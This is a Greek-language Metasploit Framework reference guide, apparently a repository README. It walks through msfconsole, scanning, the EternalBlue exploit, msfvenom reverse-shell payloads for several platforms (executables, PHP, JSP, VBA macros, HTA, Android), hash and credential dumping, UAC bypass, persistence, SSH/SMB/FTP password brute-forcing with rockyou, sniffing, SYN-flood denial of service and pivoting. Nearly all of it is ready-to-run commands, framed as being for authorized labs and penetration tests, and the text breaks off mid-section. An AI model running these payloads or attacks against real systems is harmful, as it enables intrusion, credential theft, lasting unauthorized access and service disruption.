# 🔴 Metasploit Framework — Πλήρης οδηγός αναφοράς

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe](README.tr.md)

```
                                   ___          ____
                               ,-""   `.      < HACK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _.--.__    /   ;
 (`._    _.-""       "--'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'
```

![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge&logo=metasploit)
![Kali Linux](https://img.shields.io/badge/Kali-Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Offensive Security](https://img.shields.io/badge/Offensive-Security-red?style=for-the-badge)
![Άδεια και χρήση](https://img.shields.io/badge/License-BSD--3-green?style=for-the-badge)

> **Metasploit Framework:** Πλαίσιο εργαλείων για ελέγχους διείσδυσης και εργαστηριακή μελέτη ευπαθειών.

---

## Πριν ξεκινήσετε

Το **Metasploit Framework** οργανώνει λειτουργίες ελέγχου σε **modules**, δηλαδή επιμέρους μονάδες με δικές τους επιλογές και προϋποθέσεις. Ένα **exploit** αξιοποιεί συγκεκριμένη αδυναμία, ενώ το **payload** εκτελεί την επιδιωκόμενη ενέργεια στο αντίστοιχο πλαίσιο πρόσβασης. Το **listener/handler** περιμένει ή διαχειρίζεται μια σύνδεση και η **session** είναι η συνεδρία που δημιουργείται.

Το **msfconsole** είναι η κονσόλα του πλαισίου, το **msfvenom** δημιουργεί αρχεία ή bytes payloads και τα **workspaces** διαχωρίζουν καταχωρίσεις έργων στη βάση. Τα RHOSTS/RPORT αναφέρονται στους στόχους και στις θύρες τους, ενώ LHOST/LPORT στις σχετικές παραμέτρους της επικοινωνίας του payload. Η τιμή LHOST χρειάζεται να έχει νόημα από το πραγματικό δίκτυο της άσκησης.

Οι γραμμές msf6 > και meterpreter > δείχνουν προτροπές διαφορετικών κονσολών. Τα placeholders μέσα σε <...> δεν είναι έτοιμες τιμές και δεν πρέπει να αντιμετωπίζονται ως ανακατευθύνσεις shell. Οι εντολές, τα modules και τα payloads διατηρούνται από το πρωτότυπο· χρειάζονται έλεγχο διαθεσιμότητας και επιλογών στην εγκατεστημένη έκδοση.

Χρησιμοποιήστε τον οδηγό σε δικό σας εργαστήριο ή σε συμφωνημένο έλεγχο. Οι ενότητες persistence, DoS, μεταφοράς διεργασίας και διαγραφής καταγραφών αλλάζουν την κατάσταση συστημάτων και δεν αποτελούν γενικό βήμα κάθε ελέγχου. Η κωδικοποίηση ή το HTTPS δεν εγγυώνται ότι μια ενέργεια είναι αόρατη ή ότι ένα payload θα εκτελεστεί.

## 📋 Περιεχόμενα

- [Εισαγωγή](#section-01)
- [Εγκατάσταση](#section-02)
- [Επισκόπηση αρχιτεκτονικής](#section-03)
- [Εκκίνηση Metasploit](#section-04)
- [Βασικές εντολές](#section-05)
- [Τύποι modules](#section-06)
- [Ροή εργασίας ελέγχου](#section-07)
- [Σύνδεση με βάση δεδομένων](#section-08)
- [Σάρωση και συλλογή πληροφοριών](#section-09)
- [Δημιουργία payloads με msfvenom](#section-10)
- [Ενέργειες μετά την απόκτηση πρόσβασης](#section-11)
- [Βοηθητικά modules](#section-12)
- [Παραδείγματα σεναρίων ελέγχου](#section-13)
- [Πίνακες γρήγορης αναφοράς](#section-14)
- [Συμβουλές και καλές πρακτικές](#section-15)
- [Πηγές](#section-16)
- [Άδεια και χρήση](#section-17)

---

<a id="section-01"></a>

## 🎯 Εισαγωγή

Το **Metasploit Framework** είναι πλατφόρμα ανοικτού κώδικα για ελέγχους διείσδυσης και ανάπτυξη παραδειγμάτων αξιοποίησης ευπαθειών. Περιλαμβάνει:

- 🔍 **Συλλογή πληροφοριών** και ελέγχους ενδείξεων ευπαθειών.
- 💉 **Ανάπτυξη και εκτέλεση exploit modules**.
- 🎭 **Δημιουργία payloads** για διαφορετικές πλατφόρμες.
- 🔐 **Εργαλεία και τεχνικές μετά την απόκτηση πρόσβασης**.
- 📊 **Καταγραφή δεδομένων** που υποστηρίζουν την τεκμηρίωση του ελέγχου.

### Βασικά συστατικά

| Συστατικό | Περιγραφή |
| ----------- | ------------- |
| `msfconsole` | Βασικό περιβάλλον γραμμής εντολών |
| `msfvenom` | Δημιουργία και κωδικοποίηση payloads |
| `msfdb` | Εργαλείο διαχείρισης βάσης δεδομένων |
| `msfrpcd` | Υπηρεσία RPC για απομακρυσμένη επικοινωνία |

---

<a id="section-02"></a>

## 📥 Εγκατάσταση

Ελέγξτε λειτουργικό, αρχιτεκτονική και επίσημες οδηγίες πριν από εγκατάσταση. Το παράδειγμα curl αποθηκεύει περιεχόμενο από URL και στη συνέχεια το εκτελεί· δεν αποτελεί επαλήθευση προέλευσης ή ακεραιότητας. Η [τεκμηρίωση εγκατάστασης Metasploit](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html) περιγράφει τις υποστηριζόμενες επιλογές.


### Kali Linux — Παράδειγμα εγκατάστασης ή ενημέρωσης
```bash
# Ενημέρωση Metasploit
sudo apt update && sudo apt install metasploit-framework
```

### Ubuntu/Debian
```bash
# Εγκατάσταση εξαρτήσεων
sudo apt install curl gnupg2 software-properties-common

# Παράδειγμα προσθήκης πηγής Metasploit — δείτε τη σημείωση εγκατάστασης
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

### Docker
```bash
docker pull metasploitframework/metasploit-framework
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
```

### Windows — Παράδειγμα εγκατάστασης του πρωτοτύπου
```powershell
# Διεύθυνση εγκαταστάτη του πρωτοτύπου: https://windows.metasploit.com/
# Εκκίνηση του εγκαταστάτη και εφαρμογή των οδηγιών του
```

---

<a id="section-03"></a>

## 🏗️ Επισκόπηση αρχιτεκτονικής

Τα πλήθη modules και η διάταξη του διαγράμματος είναι ενδεικτικά στοιχεία του πρωτοτύπου, όχι τρέχουσα απογραφή. Οι κατάλογοι και οι ενσωματωμένες λειτουργίες διαφέρουν ανά εγκατάσταση.


```
┌───────────────────────────────────────────────────────────────┐
│ METASPLOIT FRAMEWORK                                          │
│ EXPLOITS: modules αξιοποίησης ευπαθειών (~2000 στο πρωτότυπο) │
│ PAYLOADS: payloads (~500 στο πρωτότυπο)                       │
│ AUXILIARY: βοηθητικά modules (~1000 στο πρωτότυπο)            │
│ POST: modules μετά την πρόσβαση (~400 στο πρωτότυπο)          │
│ ENCODERS: κωδικοποιητές | NOPS: ακολουθίες NOP                │
│ EVASION: λειτουργίες αποφυγής εντοπισμού | PLUGINS: πρόσθετα  │
│ ΔΙΕΠΑΦΕΣ: msfconsole, Armitage, API, RPC                      │
│ ΒΑΣΗ ΔΕΔΟΜΕΝΩΝ: PostgreSQL                                    │
└───────────────────────────────────────────────────────────────┘
```

### Δομή καταλόγων
```
/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/      # Modules αξιοποίησης ευπαθειών
│   ├── payloads/      # Modules payloads
│   ├── auxiliary/     # Σάρωση, δοκιμές εισόδων και άλλες βοηθητικές λειτουργίες
│   ├── post/          # Ενέργειες μετά την πρόσβαση
│   ├── encoders/      # Κωδικοποιητές payloads
│   ├── nops/          # Παραγωγή ακολουθιών NOP
│   └── evasion/       # Modules που το πρωτότυπο εντάσσει στην αποφυγή εντοπισμού
├── tools/             # Πρόσθετα εργαλεία
├── scripts/           # Scripts Meterpreter
├── data/              # Λίστες λέξεων και πρότυπα
└── plugins/           # Πρόσθετα κονσόλας
```

---

<a id="section-04"></a>

## 🚀 Εκκίνηση Metasploit

### Αρχικοποίηση βάσης δεδομένων
```bash
# Εκκίνηση υπηρεσίας PostgreSQL
sudo systemctl start postgresql

# Αρχικοποίηση βάσης δεδομένων
sudo msfdb init

# Έλεγχος κατάστασης βάσης δεδομένων
sudo msfdb status
```

### Εκκίνηση msfconsole
```bash
# Τυπική εκκίνηση
msfconsole

# Εκκίνηση χωρίς το αρχικό γραφικό μήνυμα
msfconsole -q

# Εκτέλεση εντολών κατά την εκκίνηση
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100"

# Φόρτωση αρχείου εντολών
msfconsole -r commands.rc
```

---

<a id="section-05"></a>

## ⌨️ Βασικές εντολές

### Πλοήγηση και βοήθεια

| Εντολή | Περιγραφή |
| --------- | ------------- |
| `help` ή `?` | Εμφάνιση μενού βοήθειας |
| `help <command>` | Βοήθεια για συγκεκριμένη εντολή |
| `search <term>` | Αναζήτηση modules κατά όνομα, CVE ή πλατφόρμα |
| `use <module>` | Επιλογή module |
| `back` | Έξοδος από το τρέχον module |
| `info` | Εμφάνιση πληροφοριών module |
| `show options` | Εμφάνιση επιλογών module |
| `show advanced` | Εμφάνιση προχωρημένων επιλογών |
| `show payloads` | Κατάλογος συμβατών payloads |
| `show targets` | Κατάλογος υποστηριζόμενων στόχων |

### Ρύθμιση module

```bash
# Ορισμός επιλογών
set RHOSTS 192.168.1.100          # IP στόχου
set RPORT 445                      # Θύρα στόχου
set LHOST 192.168.1.50            # IP του συστήματος του ελεγκτή
set LPORT 4444                     # Τοπική θύρα του listener
set PAYLOAD windows/meterpreter/reverse_tcp

# Ορισμός κοινής τιμής για διαφορετικά modules
setg RHOSTS 192.168.1.100
setg LHOST 192.168.1.50

# Αφαίρεση τιμών επιλογών
unset RHOSTS
unsetg LHOST

# Έλεγχος τρεχουσών ρυθμίσεων
show options
check                              # Έλεγχος ενδείξεων ευπάθειας όπου υποστηρίζεται
```

### Εκτέλεση

```bash
# Εκτέλεση του επιλεγμένου module
exploit
run

# Εκτέλεση στο παρασκήνιο
exploit -j

# Εκτέλεση με συγκεκριμένες επιλογές
exploit -z                         # Χωρίς άμεση αλληλεπίδραση με τη συνεδρία μετά την επιτυχία
```

### Διαχείριση συνεδριών

```bash
# Κατάλογος συνεδριών
sessions
sessions -l

# Αλληλεπίδραση με συνεδρία
sessions -i 1

# Τερματισμός συνεδρίας
sessions -k 1

# Τερματισμός όλων των συνεδριών
sessions -K

# Παράδειγμα αναβάθμισης συνεδρίας σε Meterpreter
sessions -u 1

# Εκτέλεση εντολής στις διαθέσιμες συνεδρίες
sessions -c "sysinfo"
```

---

<a id="section-06"></a>

## 📦 Τύποι modules

Ο encoder μετασχηματίζει bytes και δεν αποτελεί εγγυημένη παράκαμψη antivirus ή EDR. Η διαθεσιμότητα payloads και η συμβατότητά τους εξαρτώνται από το module και την αρχιτεκτονική.


### 1. Modules αξιοποίησης ευπαθειών (Exploits)
Modules που αξιοποιούν συγκεκριμένες ευπάθειες υπό τις κατάλληλες προϋποθέσεις.

```bash
# Αναζήτηση modules αξιοποίησης ευπαθειών
search type:exploit platform:windows

# Παράδειγμα
use exploit/windows/smb/ms17_010_eternalblue
```

### 2. Κώδικας ενέργειας μετά την πρόσβαση (Payloads)
Κώδικας που εκτελεί την επιδιωκόμενη ενέργεια στο σχετικό πλαίσιο πρόσβασης.

**Τύποι:**
- **Singles:** Αυτοτελή payloads.
- **Stagers:** Αρχικά τμήματα που προετοιμάζουν την επικοινωνία για επόμενο στάδιο.
- **Stages:** Επόμενα τμήματα που φορτώνονται μέσω stagers, όπως σε αντίστοιχες υλοποιήσεις Meterpreter.

```bash
# Προβολή: payloads
show payloads

# Μορφή ονομασίας payloads
<platform>/<arch>/<type>/<connection>
# Παράδειγμα: windows/x64/meterpreter/reverse_tcp
```

### 3. Βοηθητικές λειτουργίες (Auxiliary)
Σάρωση, δοκιμές εισόδων, καταγραφή επικοινωνίας και άλλες βοηθητικές λειτουργίες.

```bash
search type:auxiliary
use auxiliary/scanner/portscan/tcp
```

### 4. Modules μετά την πρόσβαση (Post)
Modules για ενέργειες μετά την απόκτηση κατάλληλης συνεδρίας.

```bash
search type:post platform:windows
use post/windows/gather/hashdump
```

### 5. Κωδικοποιητές payloads (Encoders)
Μετασχηματισμός της αναπαράστασης payloads. Η κωδικοποίηση δεν εγγυάται αποφυγή εντοπισμού.

```bash
show encoders
# Παράδειγμα: x86/shikata_ga_nai
```

---

<a id="section-07"></a>

## 🎯 Ροή εργασίας ελέγχου

Το check δεν υποστηρίζεται σε όλα τα modules και το αποτέλεσμά του δεν είναι καθολική απόδειξη επιτυχούς εκμετάλλευσης. Εξετάστε τη βοήθεια, τις προϋποθέσεις και την επίπτωση του επιλεγμένου module.


```
Συλλογή πληροφοριών και διερεύνηση
    ↓
Επιλογή module
    ↓
Ρύθμιση επιλογών
    ↓
Έλεγχος προϋποθέσεων και ενδείξεων όπου υποστηρίζεται
    ↓
Εκτέλεση module
    ↓
Ενέργειες μετά την πρόσβαση, στο συμφωνημένο πεδίο
```

### Παράδειγμα βήμα προς βήμα

```bash
# 1. Αναζήτηση σχετικού module
msf6 > search eternalblue

# 2. Επιλογή module
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 3. Προβολή επιλογών
msf6 exploit(ms17_010_eternalblue) > show options

# 4. Ορισμός στόχου
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# 5. Ορισμός payload
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 6. Ορισμός listener
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

# 7. Προαιρετικός έλεγχος ενδείξεων ευπάθειας
msf6 exploit(ms17_010_eternalblue) > check

# 8. Εκτέλεση
msf6 exploit(ms17_010_eternalblue) > exploit
```

---

<a id="section-08"></a>

## 🗄️ Σύνδεση με βάση δεδομένων

### Ρύθμιση και σύνδεση

```bash
# Αρχικοποίηση βάσης δεδομένων
msfdb init

# Σύνδεση στη βάση δεδομένων
db_connect msf:password@127.0.0.1/msf

# Έλεγχος κατάστασης
db_status

# Αποσύνδεση
db_disconnect
```

### Διαχείριση χώρων εργασίας

```bash
# Προβολή: χώροι εργασίας
workspace

# Δημιουργία χώρου εργασίας
workspace -a pentest_project

# Μετάβαση σε χώρο εργασίας
workspace pentest_project

# Διαγραφή χώρου εργασίας
workspace -d old_project

# Μετονομασία χώρου εργασίας
workspace -r old_name new_name
```

### Διαχείριση καταχωρίσεων συστημάτων

```bash
# Προβολή: καταχωρισμένα συστήματα
hosts

# Χειροκίνητη καταχώριση συστήματος
hosts -a 192.168.1.100

# Αφαίρεση καταχώρισης συστήματος
hosts -d 192.168.1.100

# Αναζήτηση καταχωρίσεων συστημάτων
hosts -S windows

# Εξαγωγή καταχωρίσεων συστημάτων
hosts -o /tmp/hosts.csv
```

### Διαχείριση καταχωρίσεων υπηρεσιών

```bash
# Προβολή: υπηρεσίες
services

# Φιλτράρισμα κατά θύρα
services -p 80,443

# Φιλτράρισμα κατά όνομα υπηρεσίας
services -s http

# Αναζήτηση υπηρεσιών
services -S microsoft
```

### Διαχείριση καταχωρίσεων ευπαθειών

```bash
# Προβολή καταλόγου ελέγχων ευπαθειών
vulns

# Προσθήκη καταχώρισης ευπάθειας
vulns -a 192.168.1.100 -n "MS17-010"
```

### Εισαγωγή και εξαγωγή δεδομένων

```bash
# Εισαγωγή αποτελεσμάτων Nmap
db_import /path/to/nmap_scan.xml

# Εισαγωγή αποτελεσμάτων Nessus
db_import /path/to/nessus_scan.nessus

# Εκτέλεση Nmap μέσα από το περιβάλλον
db_nmap -sV -O 192.168.1.0/24

# Εξαγωγή δεδομένων
hosts -o hosts.csv
services -o services.csv
```

---

<a id="section-09"></a>

## 🔍 Σάρωση και συλλογή πληροφοριών

### Σάρωση θυρών

```bash
# Σάρωση TCP SYN
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# Σάρωση με σύνδεση TCP
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.100
set PORTS 1-65535
set THREADS 50
run
```

### Διερεύνηση υπηρεσιών

```bash
# Διερεύνηση SMB
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# Κοινόχρηστοι πόροι SMB
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.100
run

# Αναγνώριση έκδοσης SSH
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# Αναγνώριση έκδοσης HTTP
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# Διερεύνηση FTP
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run
```

### Έλεγχοι ενδείξεων ευπαθειών

```bash
# Έλεγχος ενδείξεων MS17-010 στο SMB
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# Παράδειγμα module ελέγχου συγκεκριμένης ευπάθειας HTTP
use auxiliary/scanner/http/http_vuln_cve_2021_26855
set RHOSTS 192.168.1.100
run
```

---

<a id="section-10"></a>

## 💉 Δημιουργία payloads με msfvenom

### Βασική σύνταξη
```bash
msfvenom -p <PAYLOAD> <OPTIONS> -f <FORMAT> -o <OUTPUT>
```

### Συνηθισμένες επιλογές

| Επιλογή | Περιγραφή |
| -------- | ------------- |
| `-p` | Payload προς χρήση |
| `-f` | Μορφή εξόδου |
| `-o` | Αρχείο εξόδου |
| `-e` | Κωδικοποιητής προς χρήση |
| `-i` | Επαναλήψεις κωδικοποίησης |
| `-b` | Bytes που πρέπει να αποκλειστούν στο συγκεκριμένο πλαίσιο |
| `-n` | Μέγεθος ακολουθίας NOP |
| `--platform` | Πλατφόρμα στόχου |
| `-a` | Αρχιτεκτονική |
| `LHOST` | IP του listener |
| `LPORT` | Θύρα του listener |

### Payloads για Windows

```bash
# Αντίστροφη σύνδεση TCP με Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# Αντίστροφη σύνδεση TCP για x64
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell64.exe

# Αντίστροφη σύνδεση HTTPS
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o shell_https.exe

# Αναμονή εισερχόμενης σύνδεσης TCP
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind_shell.exe

# Παράδειγμα κωδικοποίησης — δεν εγγυάται αποφυγή εντοπισμού
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
```

### Payloads για Linux

```bash
# Αντίστροφη σύνδεση TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell

# Αντίστροφη σύνδεση TCP για x64
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell64

# Κονσόλα που περιμένει εισερχόμενη σύνδεση
msfvenom -p linux/x86/shell/bind_tcp LPORT=4444 -f elf -o bind_shell
```

### Payloads για περιβάλλοντα ιστού

```bash
# Αντίστροφη σύνδεση μέσω PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# Αντίστροφη σύνδεση σε μορφή ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# Αντίστροφη σύνδεση σε μορφή ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx -o shell.aspx

# Αντίστροφη σύνδεση μέσω JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp

# Αρχείο WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
```

### Payloads σε μορφές scripts

```bash
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# VBA — μακροεντολή
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f vba -o shell.vba

# HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f hta-psh -o shell.hta
```

### Payloads για Android

```bash
# Αντίστροφη σύνδεση TCP για Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o app.apk
```

### Payloads για macOS

```bash
# Αντίστροφη σύνδεση TCP για macOS
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o shell
```

### Ρύθμιση multi/handler

```bash
# Εκκίνηση listener
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

---

<a id="section-11"></a>

## 🔓 Ενέργειες μετά την απόκτηση πρόσβασης

### Βασικά modules μετά την πρόσβαση

```bash
# Ανάκτηση: πληροφορίες συστήματος
use post/windows/gather/enum_system

# Ανάκτηση: συνδεδεμένοι χρήστες
use post/windows/gather/enum_logged_on_users

# Εξαγωγή διαθέσιμων hashes κωδικών
use post/windows/gather/hashdump

# Διαθέσιμα στοιχεία ταυτοποίησης στη μνήμη
use post/windows/gather/credentials/credential_collector

# Έλεγχος ενδείξεων εικονικής μηχανής
use post/windows/gather/checkvm
```

### Ανύψωση δικαιωμάτων

```bash
# Αναζήτηση πιθανών σχετικών τοπικών αδυναμιών
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Παράδειγμα παράκαμψης UAC υπό συγκεκριμένες προϋποθέσεις
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# Απόπειρα απόκτησης δικαιωμάτων SYSTEM
use post/windows/escalate/getsystem
```

### Διατήρηση πρόσβασης (Persistence)

Οι τίτλοι «Registry» και «Scheduled task» του πρωτοτύπου δεν αρκούν για να περιγράψουν με ακρίβεια τη συμπεριφορά των αναφερόμενων modules. Ελέγξτε το συγκεκριμένο module και μην θεωρείτε τα snippets πλήρη διαδικασία εγκατάστασης ή αφαίρεσης persistence.


```bash
# Παράδειγμα διατήρησης πρόσβασης με αλλαγές μητρώου
use exploit/windows/local/persistence_service
set SESSION 1
run

# Περιγραφή διατήρησης πρόσβασης του πρωτοτύπου — ελέγξτε το module
use post/windows/manage/persistence_exe
set SESSION 1
set STARTUP SYSTEM
run
```

---

<a id="section-12"></a>

## 🔧 Βοηθητικά modules

### Δοκιμή στοιχείων σύνδεσης από λίστες

```bash
# Δοκιμή στοιχείων σύνδεσης SSH από λίστα
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run

# Δοκιμή στοιχείων σύνδεσης SMB από λίστα
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set SMBUser administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# Δοκιμή στοιχείων σύνδεσης FTP από λίστα
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USERNAME anonymous
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### Καταγραφή δικτυακής επικοινωνίας

```bash
# Παράδειγμα καταγραφής δεδομένων HTTP
use auxiliary/sniffer/psnuffle
run

# Καταγραφή πακέτων
use auxiliary/sniffer/capture
set INTERFACE eth0
run
```

### Δοκιμή άρνησης υπηρεσίας — μόνο στο συμφωνημένο εργαστήριο

```bash
# Δοκιμή πλημμύρας SYN του πρωτοτύπου
use auxiliary/dos/tcp/synflood
set RHOSTS 192.168.1.100
set RPORT 80
run
```

---

<a id="section-13"></a>

## 🎬 Παραδείγματα σεναρίων ελέγχου

### Παράδειγμα 1: Σενάριο MS17-010 / EternalBlue

```bash
# Εκκίνηση Metasploit
msfconsole -q

# Αναζήτηση σχετικού module
search eternalblue

# Επιλογή module
use exploit/windows/smb/ms17_010_eternalblue

# Ρύθμιση
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# Έλεγχος ενδείξεων ευπάθειας
check

# Εκτέλεση module
exploit
```

### Παράδειγμα 2: Σενάριο εφαρμογής ιστού

```bash
# Παράδειγμα ελέγχου για σχετικές ενδείξεις
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# Παράδειγμα module μεταφόρτωσης αρχείου
use exploit/multi/http/php_file_upload
set RHOSTS 192.168.1.100
set TARGETURI /uploads/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

### Παράδειγμα 3: Multi-handler με msfvenom

```bash
# Τερματικό 1: Δημιουργία payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Τερματικό 2: Εκκίνηση handler
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j

# Το πρωτότυπο περιγράφει μεταφορά και εκτέλεση του payload.exe στο εργαστηριακό σύστημα
# Αναμενόμενη σύνδεση συνεδρίας στον handler, εφόσον πληρούνται οι προϋποθέσεις
```

### Παράδειγμα 4: Pivoting μέσω διαθέσιμης συνεδρίας

```bash
# Μετά την απόκτηση κατάλληλης συνεδρίας Meterpreter
meterpreter > run autoroute -s 10.10.10.0/24

# Εναλλακτικά μέσα από msfconsole
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.10.0
run

# Παράδειγμα σάρωσης εσωτερικού δικτύου στο πεδίο του ελέγχου
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,445
run
```

---

<a id="section-14"></a>

## 📊 Πίνακες γρήγορης αναφοράς

### Βασικές εντολές

| Εντολή | Περιγραφή |
| --------- | ------------- |
| `search <term>` | Αναζήτηση modules |
| `use <module>` | Επιλογή module |
| `show options` | Εμφάνιση επιλογών |
| `set <opt> <val>` | Ορισμός τιμής επιλογής |
| `exploit` / `run` | Εκτέλεση module |
| `back` | Επιστροφή στο κύριο περιβάλλον |
| `sessions -l` | Κατάλογος συνεδριών |
| `sessions -i <id>` | Αλληλεπίδραση με συνεδρία |

### Συνηθισμένα payloads

| Payload | Περιγραφή |
| --------- | ------------- |
| `windows/meterpreter/reverse_tcp` | Meterpreter για Windows 32 bit |
| `windows/x64/meterpreter/reverse_tcp` | Meterpreter για Windows 64 bit |
| `windows/meterpreter/reverse_https` | Κρυπτογραφημένη σύνδεση |
| `linux/x86/meterpreter/reverse_tcp` | Meterpreter για Linux |
| `php/meterpreter/reverse_tcp` | Meterpreter για PHP |
| `java/jsp_shell_reverse_tcp` | Κονσόλα μέσω Java/JSP |
| `android/meterpreter/reverse_tcp` | Meterpreter για Android |

### Μορφές εξόδου msfvenom

| Μορφή | Επέκταση | Χρήση |
| -------- | ----------- | ---------- |
| `exe` | .exe | Εκτελέσιμο Windows |
| `elf` | (χωρίς υποχρεωτική επέκταση στο παράδειγμα) | Εκτελέσιμο Linux |
| `macho` | (χωρίς υποχρεωτική επέκταση στο παράδειγμα) | Εκτελέσιμο macOS |
| `raw` | διαφέρει | Ακατέργαστα bytes shellcode |
| `asp` | .asp | Περιβάλλον διακομιστή IIS |
| `aspx` | .aspx | Περιβάλλον διακομιστή .NET |
| `php` | .php | Περιβάλλον PHP |
| `jsp` | .jsp | Περιβάλλον Java |
| `war` | .war | Πακέτο για περιβάλλον Tomcat |
| `psh` | .ps1 | Script PowerShell |
| `vba` | .vba | Μακροεντολή Office |
| `dll` | .dll | Βιβλιοθήκη Windows |

### Ενδεικτικοί κωδικοποιητές

| Κωδικοποιητής | Περιγραφή |
| --------- | ------------- |
| `x86/shikata_ga_nai` | Πολυμορφικός κωδικοποιητής XOR |
| `x64/xor` | Κωδικοποιητής XOR 64 bit |
| `x86/alpha_mixed` | Αλφαριθμητικός κωδικοποιητής |
| `php/base64` | Κωδικοποιητής Base64 για PHP |

---

<a id="section-15"></a>

## 💡 Συμβουλές και καλές πρακτικές

### ⚠️ Πλαίσιο εξουσιοδοτημένης χρήσης
> **Πλαίσιο χρήσης:** Χρησιμοποιήστε το υλικό σε δικά σας συστήματα ή σε ελέγχους με ρητή εξουσιοδότηση και συμφωνημένο πεδίο.

### Συμβουλές οργάνωσης και εκτέλεσης

1. **Χρήση βάσης δεδομένων**
   ```bash
   # Αρχικοποίηση και χρήση βάσης δεδομένων σύμφωνα με τις ανάγκες του έργου
   msfdb init
   db_status
   ```

2. **Χρήση ξεχωριστών χώρων εργασίας**
   ```bash
   workspace -a client_pentest
   ```

3. **Αρχεία εντολών (Resource Scripts)**
   ```bash
   # Αποθήκευση εντολών σε αρχείο .rc
   echo "use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.50
   set LPORT 4444
   exploit -j" > handler.rc
   
   # Εκτέλεση αρχείου εντολών
   msfconsole -r handler.rc
   ```

4. **Κατάλληλη επιλογή παράλληλων νημάτων**
   ```bash
